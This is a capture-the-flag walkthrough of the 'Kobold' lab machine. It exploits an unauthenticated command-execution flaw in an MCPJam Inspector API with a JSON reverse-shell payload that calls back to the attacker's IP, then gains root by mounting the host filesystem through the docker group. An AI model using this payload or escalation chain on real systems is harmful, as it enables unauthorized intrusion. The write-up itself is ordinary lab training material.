Machine Name: Kobold  
Machine IP: 10.129.17.107  
Lets loot at the open ports:    
```bash
rustscan -a 10.129.17.107

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
80/tcp   open  http     syn-ack ttl 63
443/tcp  open  https    syn-ack ttl 63
3552/tcp open  taserver syn-ack ttl 63

```
Add kobold.htb domain into **/etc/hosts** file. I made a directory scan for this domain but didn't get any result. So, I made a subdirectory attack to see the subdomains.    
```bash
ffuf -H "Host: FUZZ.kobold.htb" -u https://kobold.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ic -fs 154

mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 236ms]
bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 303ms]
```

I added them into /etc/hosts file and lets check what are they.    

----
**mcp.kobold.htb** --> This subdomain forwars us to the **MCPJam Inspector** site. And it had a vulnerability in recent days --> **https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6**        

## Vulnerability Analysis: MCPJam Inspector RCE  

### 1. What is this website for?  
The target subdomain, mcp.kobold.htb, is running MCPJam Inspector. This is a local-first development platform used to test and manage Model Context Protocol (MCP) servers, which allow LLMs (Large Language Models) to interact with external tools and data. By default, this application should only be accessible via localhost (127.0.0.1), but in this case, it is misconfigured to listen on 0.0.0.0, making it reachable over the network.  

### 2. Which vulnerability are we exploiting?  
We are exploiting an Unauthenticated Remote Code Execution (RCE) vulnerability. The application exposes an API endpoint at **/api/mcp/connect**.  

    The Root Cause: This endpoint is designed to "connect" to a new MCP server by executing a system command provided in the request body.

    The Flaw: It performs no authentication or input validation on the command and args fields. It blindly executes whatever is passed to it as a system-level process.

### 3. How will we get a shell?  
The strategy is to send a crafted HTTP POST request containing a JSON payload to the vulnerable API. Instead of providing a legitimate MCP server command, we will inject a Reverse Shell payload.  

----
Firstly, lets open this URL ***(https://mcp.kobold.htb/api/mcp/connect)*** and get the request by the help of Burp Suite.  

First Version:  

<img width="1131" height="794" alt="image" src="https://github.com/user-attachments/assets/0931a0c1-7716-4283-8df9-2784f24de62b" />    

----
Last Version:  

<img width="1134" height="1028" alt="image" src="https://github.com/user-attachments/assets/9a5f0a5e-9c76-4acf-bf0a-fc516c07a6fe" />  

----
As you can see I changet **"GET"** method to the **"POST"**. And this to the request:    
```bash
Content-Type: application/json
Content-Length: 155

{
  "serverId": "pwn_farid",
  "serverConfig": {
    "command": "/bin/bash",
    "args": ["-c", "bash -i >& /dev/tcp/10.10.15.126/4444 0>&1"]
  }
}
```
Don't forget to open a nc connection before sending this request. Bingoo!!! We got shell.    
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444                            
listening on [any] 4444 ...
connect to [10.10.15.126] from (UNKNOWN) [10.129.17.107] 53562
bash: cannot set terminal process group (1526): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ whoami
whoami
ben
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

----
# User Flag  
I got the user flag:    
```bash
VITE_DISABLE_POSTHOG_LOCAL=falseben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cd /home/ben
cd /home/ben
ben@kobold:~$ ls -la
ls -la
total 28
drwxr-x--- 3 ben  ben  4096 Mar 16 14:12 .
drwxr-xr-x 4 root root 4096 Mar 15 21:23 ..
-rw-r--r-- 1 ben  ben     0 Mar 16 14:12 .bash_history
-rw-r--r-- 1 ben  ben   220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 ben  ben  3771 Mar 31  2024 .bashrc
drwx------ 2 ben  ben  4096 Mar 15 21:23 .cache
-rw-r--r-- 1 ben  ben   807 Mar 31  2024 .profile
-rw-r----- 1 root ben    33 Mar 29 08:17 user.txt
ben@kobold:~$ cat user.txt
cat user.txt
cad635a94a691d1bf836b3324bd1f232
ben@kobold:~$ 
```

----
# Root Flag  
There are several Rabbit Holes, so i will show you the proper way to be **root** without touching other things.    

I looked through which groups I am in.  
```bash
ben@kobold:~$ id
id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
ben@kobold:~$ find / --group operator 2>/dev/null
find / --group operator 2>/dev/null
ben@kobold:~$ find / -group operator 2>/dev/null
find / -group operator 2>/dev/null
/privatebin-data
/privatebin-data/certs
/privatebin-data/certs/key.pem
/privatebin-data/certs/cert.pem
/privatebin-data/data
/privatebin-data/data/purge_limiter.php
/privatebin-data/data/bd
/privatebin-data/data/bd/b5
/privatebin-data/data/.htaccess
/privatebin-data/data/e3
/privatebin-data/data/traffic_limiter.php
/privatebin-data/data/salt.php
ben@kobold:~$ 
```
The **/privatebin-data** folder is completely a **rabbit hole**. So, lets go to the proper solution. I checked for active processes.    
```bash
ben@kobold:~$ ps aux
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.1  0.3  22160 13332 ?        Ss   08:16   0:02 /sbin/init autoinstall
root           2  0.0  0.0      0     0 ?        S    08:16   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        S    08:16   0:00 [pool_workqueue_release]
root          18  0.0  0.0      0     0 ?        S    08:16   0:00 [migration/0]
root          48  0.0  0.0      0     0 ?        I<   08:16   0:00 [kworker/R-devfr]
root          49  0.0  0.0      0     0 ?        S    08:16   0:00 [watchdogd]
root          50  0.0  0.0      0     0 ?        I<   08:16   0:00 [kworker/R-quota]
root          51  0.0  0.0      0     0 ?        I<   08:16   0:00 [kworker/1:1H-kblockd]
root          52  0.0  0.0      0     0 ?        S    08:16   0:00 [kswapd0]
root          53  0.0  0.0      0     0 ?        S    08:16   0:00 [ecryptfs-kthread]
root          54  0.0  0.0      0     0 ?        I<   08:16   0:00 [kworker/R-kthro]
root         242  0.0  0.0      0     0 ?        S    08:16   0:00 [scsi_eh_30]
root         243  0.0  0.0      0     0 ?        I<   08:16   0:00 [kworker/R-scsi_]
root         244  0.0  0.0      0     0 ?        S    08:16   0:00 [scsi_eh_31]
root         245  0.0  0.0      0     0 ?        I<   08:16   0:00 [kworker/R-scsi_]
root         266  0.0  0.0      0     0 ?        I    08:16   0:00 [kworker/u4:26-flush-252:0]
root         269  0.0  0.0      0     0 ?        I    08:16   0:00 [kworker/u4:29-events_power_efficient]
root         282  0.0  0.0      0     0 ?        I<   08:16   0:00 [kworker/R-kdmfl]
root         308  0.0  0.0      0     0 ?        I<   08:16   0:00 [kworker/R-raid5]
root         341  0.0  0.0      0     0 ?        S    08:16   0:00 [jbd2/dm-0-8]
root         342  0.0  0.0      0     0 ?        I<   08:16   0:00 [kworker/R-ext4-]
root         383  0.0  0.0      0     0 ?        S    08:16   0:00 [psimon]
root         388  0.0  0.4  66936 17016 ?        S<s  08:16   0:00 /usr/lib/systemd/systemd-journald
root         412  0.2  0.0      0     0 ?        I    08:16   0:06 [kworker/0:3-events]
root         425  0.0  0.2  30000  8776 ?        Ss   08:16   0:00 /usr/lib/systemd/systemd-udevd
root         452  0.0  0.0      0     0 ?        S    08:16   0:00 [psimon]
root         517  0.0  0.0      0     0 ?        S    08:16   0:00 [irq/60-vmw_vmci]
root         518  0.0  0.0      0     0 ?        S    08:16   0:00 [irq/61-vmw_vmci]
root         519  0.0  0.0      0     0 ?        S    08:16   0:00 [irq/62-vmw_vmci]
root         540  0.0  0.0      0     0 ?        S    08:16   0:00 [irq/16-vmwgfx]
root         542  0.0  0.0      0     0 ?        I<   08:16   0:00 [kworker/R-ttm]
root         587  0.0  0.0      0     0 ?        I<   08:16   0:00 [kworker/R-crypt]
root         590  0.0  0.0      0     0 ?        S    08:16   0:00 [jbd2/sda2-8]
root         591  0.0  0.0      0     0 ?        I<   08:16   0:00 [kworker/R-ext4-]
systemd+     646  0.0  0.3  21588 12856 ?        Ss   08:16   0:00 /usr/lib/systemd/systemd-resolved
systemd+     649  0.0  0.1  91028  7800 ?        Ssl  08:16   0:00 /usr/lib/systemd/systemd-timesyncd
root         659  0.0  0.1  88332  4524 ?        S<sl 08:16   0:00 /sbin/auditd
_laurel      662  0.0  0.1   9996  6228 ?        S<   08:16   0:00 /usr/local/sbin/laurel --config /etc/laurel/config.toml
root         752  0.0  0.0      0     0 ?        S    08:16   0:00 [audit_prune_tree]
root         838  0.0  0.2  53468 11980 ?        Ss   08:16   0:00 /usr/bin/VGAuthService
root         841  0.2  0.2 243528 10448 ?        Ssl  08:16   0:06 /usr/bin/vmtoolsd
root         856  0.0  0.0   3940  3236 ?        Ss   08:16   0:00 dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
message+     888  0.0  0.1   9808  5444 ?        Ss   08:16   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
polkitd      917  0.0  0.1 308164  7972 ?        Ssl  08:16   0:00 /usr/lib/polkit-1/polkitd --no-debug
root         931  0.0  0.2  17632  8068 ?        Ss   08:16   0:00 /usr/lib/systemd/systemd-logind
root         932  0.0  0.3 468988 13556 ?        Ssl  08:16   0:00 /usr/libexec/udisks2/udisksd
root        1031  0.0  0.3 392096 12880 ?        Ssl  08:16   0:00 /usr/sbin/ModemManager
syslog      1105  0.0  0.1 222508  6112 ?        Ssl  08:16   0:00 /usr/sbin/rsyslogd -n -iNONE
root        1524  0.0  1.4 1381688 56300 ?       Ssl  08:17   0:01 /root/arcane_linux_amd64
ben         1526  0.0  1.2 643116 48372 ?        Ssl  08:17   0:00 node /usr/local/bin/inspector
root        1528  0.0  0.0   6824  2864 ?        Ss   08:17   0:00 /usr/sbin/cron -f -P
root        1536  0.0  0.5 206828 21652 ?        Ss   08:17   0:00 php-fpm: master process (/etc/php/8.3/fpm/php-fpm.conf)
root        1540  0.0  1.2 1802380 49384 ?       Ssl  08:17   0:01 /usr/bin/containerd
root        1560  0.0  0.0   6104  2000 tty1     Ss+  08:17   0:00 /sbin/agetty -o -p -- \u --noclear - linux
root        1566  0.0  0.0  12216  2220 ?        Ss   08:17   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data    1567  0.7  0.2  14716  9864 ?        S    08:17   0:15 nginx: worker process
www-data    1568  0.4  0.2  13984  9328 ?        S    08:17   0:10 nginx: worker process
www-data    1585  0.0  0.2 207336 11140 ?        S    08:17   0:00 php-fpm: pool www
www-data    1586  0.0  0.2 207336  8684 ?        S    08:17   0:00 php-fpm: pool www
root        1613  0.0  1.8 1972104 73736 ?       Ssl  08:17   0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
ben         1637  0.2  3.3 32543500 133464 ?     Sl   08:17   0:05 node /usr/local/lib/node_modules/@mcpjam/inspector/dist/server/index.js
root        1898  0.0  0.3 1238384 14648 ?       Sl   08:17   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 4c49dd7bb727a4d23a490c8a7cdaa2e6b81f610e3bec92198ed8024c1d78d637 -address /run/containerd/containerd.sock
nobody      1919  0.0  0.0   1316  1080 ?        Ss   08:17   0:00 s6-svscan /run/services
root        1953  0.0  0.1 1671112 4416 ?        Sl   08:17   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.2 -container-port 8080 -use-listen-fd
nobody      1976  0.0  0.0   1092   736 ?        S    08:17   0:00 s6-supervise php-fpm84
nobody      1977  0.0  0.0   1092   740 ?        S    08:17   0:00 s6-supervise nginx
nobody      1978  0.0  0.0   1176   800 ?        Ss   08:17   0:00 forx -o 127 timer  0  1  2  3  4  5  6  7  8  9  ifelse  test  -S  /var/run/php-fpm.sock   /usr/sbin/nginx  foreground  sleep  1  exit 127
nobody      1979  0.0  0.4 170496 19156 ?        Ss   08:17   0:00 php-fpm: master process (/etc/php84/php-fpm.conf)
nobody      2007  0.0  0.3 170612 14200 ?        S    08:17   0:00 php-fpm: pool www
nobody      2008  0.0  0.2 170612 11728 ?        S    08:17   0:00 php-fpm: pool www
nobody      2009  0.0  0.1  10116  5972 ?        S    08:17   0:00 nginx: master process /usr/sbin/nginx
nobody      2011  0.0  0.1  13596  6444 ?        S    08:17   0:00 nginx: worker process
nobody      2012  0.0  0.1  13596  6468 ?        S    08:17   0:00 nginx: worker process
root        2067  0.0  0.2  12024  8076 ?        Ss   08:18   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        2159  0.2  0.0      0     0 ?        I    08:40   0:01 [kworker/1:3-events]
root        2178  0.0  0.0      0     0 ?        I    08:44   0:00 [kworker/u4:1-events_power_efficient]
ben         2184  0.0  0.0   4588  3952 ?        S    08:45   0:00 bash -i
root        2200  0.1  1.0 478708 42456 ?        Ssl  08:49   0:00 /usr/libexec/fwupd/fwupd
root        2207  0.0  0.2 314004  8960 ?        Ssl  08:49   0:00 /usr/libexec/upowerd
root        2220  0.0  0.0      0     0 ?        I    08:49   0:00 [kworker/0:1-cgroup_free]
root        2223  0.0  0.0      0     0 ?        I    08:50   0:00 [kworker/1:0]
root        2227  0.0  0.0      0     0 ?        I    08:52   0:00 [kworker/u4:0-flush-252:0]
ben         2228  150  0.1   7892  4136 ?        R    08:53   0:00 ps aux

```

Processes Proving the Existence of **Docker**:  

    dockerd (PID 1613): This is the main Docker service (daemon). It indicates that Docker is installed and running on the system.

    containerd (PID 1540): The underlying infrastructure used by Docker to manage containers.

    docker-proxy (PID 1953): An intermediary that redirects network traffic from the host machine into the container. Here, we see it forwarding port 8080 from 127.0.0.1 (localhost) to port 8080 inside the container.

    containerd-shim-runc-v2 (PID 1898): Indicates that there is currently an active running container.


As you remembered, ben user isn't in docker group.   
### The Trick (Activation):  
In some Linux systems, a user might be added to a group, but it doesn't show up in the current session. To "activate" this hidden permission, I used the newgrp command. If it works, we will be in docker group:  
```bash
ben@kobold:~$ id
id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

ben@kobold:~$ newgrp docker
newgrp docker

id
uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)

docker images
REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
mysql                         latest    f66b7a288113   7 weeks ago    922MB
privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   5 months ago   122MB
```
### Why is this important?  
Being in the docker group is the same as being ROOT. Since Docker runs with high privileges, I can use it to mount the entire hard drive of the machine into a container and read any file (like /etc/shadow or the root flag).    
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

ben@kobold:~$ docker run --rm --entrypoint /bin/sh -v /:/mnt -it mysql
docker run --rm --entrypoint /bin/sh -v /:/mnt -it mysql
sh-5.1# cd /mnt/root/
cd /mnt/root/
sh-5.1# ls -la
ls -la
total 87268
drwx------  7 root root     4096 Mar 29 08:17 .
drwxr-xr-x 22 root root     4096 Mar 16 20:57 ..
-rw-r--r--  1 root root       29 Mar 19 03:09 .bash_history
-rw-r--r--  1 root root     3106 Apr 22  2024 .bashrc
drwx------  2 root root     4096 Mar 15 21:23 .cache
drwxr-xr-x  3 root root     4096 Mar 15 21:23 .local
drwxr-xr-x  4 root root     4096 Mar 15 21:23 .npm
-rw-r--r--  1 root root      161 Apr 22  2024 .profile
drwx------  2 root root     4096 Mar 15 21:23 .ssh
-rwxr-xr-x  1 root root 89313464 Jan 15 01:05 arcane_linux_amd64
drwxr-xr-x  3 root root     4096 Mar 29 08:17 data
-rw-r-----  1 root root       33 Mar 29 08:17 root.txt
sh-5.1# cat root.txt
```














